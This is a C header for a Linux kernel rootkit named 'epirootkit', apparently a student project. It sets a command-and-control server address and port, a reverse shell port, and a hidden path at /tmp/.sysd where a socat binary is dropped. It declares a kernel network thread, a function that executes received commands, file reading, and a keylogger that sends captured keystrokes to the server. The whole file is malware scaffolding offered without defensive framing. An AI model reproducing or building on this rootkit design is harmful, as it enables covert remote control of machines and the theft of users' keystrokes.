#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/types.h>
#include <linux/slab.h>



// Configuration macros
#define SERVER_IP "192.168.100.1"
#define SERVER_PORT 4242
#define REVERSE_SHELL_PORT 9001
#define CONNEXION_MESSAGE "epirootkit: connexion established\n"
#define SOCAT_BINARY_PATH "/tmp/.sysd"

#define SUCCESS 0
#define FAILURE 1
#define MAX_SENDING_MSG_ATTEMPTS 10
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024
#define STD_BUFFER_SIZE 4096

// Used by exec_str_as_command 
// to store the return code of the command
struct exec_code_stds {
	int code;
	char *std_out;
	char *std_err;
};

// Used by print_file
// Corresponds to the log level to use for printing
enum text_level {
	INFO,
	WARN,
	ERR,
	CRIT,
};

// Global control variables
extern struct socket *sock;					// Socket for network communication
extern struct exec_code_stds exec_result;	// Last execution result
extern struct task_struct *network_thread;	// Thread for network communication
extern bool thread_exited;					// Flag to indicate if the thread has exited

// Function prototypes
int init_exec_result(void);								// Initialize exec_result structure
int exec_str_as_command(char *user_cmd);				// Execute a command string in user mode
int send_to_server(char *message);						// Send a message to the server
int network_worker(void *data);							// Kernel thread for network communication
char *read_file(char *filename);						// Read the content of a file into a dynamically allocated buffer
void print_file(char *content, enum text_level level);	// Print the content of a buffer to the kernel log
int close_socket(void);									// Release the socket
int close_thread(void);									// Close the kernel thread
int epikeylog_init(int keylog_mode);					// Initialize the keylogger
int epikeylog_send_to_server(void);						// Send keylogger content to the server
void epikeylog_exit(void);								// Cleanup function for the keylogger
int drop_socat_binaire(void);							// Drop the socat binary in /tmp/.sysd

extern char *ip;
extern int port;
extern char *message;

#endif // EPIROOTKIT_H
